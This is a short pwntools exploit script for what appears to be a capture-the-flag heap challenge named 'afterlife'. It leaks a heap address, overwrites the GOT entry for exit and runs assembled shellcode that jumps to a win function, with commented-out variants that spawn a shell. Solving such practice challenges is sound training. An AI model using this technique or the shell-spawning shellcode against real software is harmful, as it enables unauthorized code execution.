from pwn import *

DEBUG = True
context(arch='i386', os='linux', log_level='debug')

if DEBUG:
	BINFILE = "./vuln"
else:
	BINFILE = "/problems/afterlife_4_1753231287c321c4b5b1102d1b2272c6/vuln"

bin = ELF(BINFILE)

# win = 0x08048966
win = bin.sym['win']
exit_got = bin.got['exit']
sh = process([BINFILE, 'A'])
leak = int(sh.recvuntil("you").split("\n")[-2])

print("win     : {}".format(hex(win)))
print("exit_got: {}".format(hex(exit_got)))
print("leak    : {}".format(hex(leak)))

payload  = ""
payload += p32(exit_got - 12)

# payload += p32(leak + 8)
# payload += asm('''
# 	jmp aaa
# 	{}
# aaa:
# 	'''.format('nop\n'*11) + shellcraft.i386.linux.sh())

# payload += p32(leak + 8)
# payload += asm('''
# 	jmp aaa
# 	{}
# aaa:
# 	push {}
# 	call [esp]
# 	'''.format('nop\n'*11, win))

# payload += p32(leak + 8)
# payload += asm('''
# 	push {}
# 	call [esp]
# '''.format(win))

payload += p32(leak + 8)
payload += asm('''
	mov edi, {}
	call edi
'''.format(win))



sh.sendlineafter('...\n', payload)
sh.interactive()
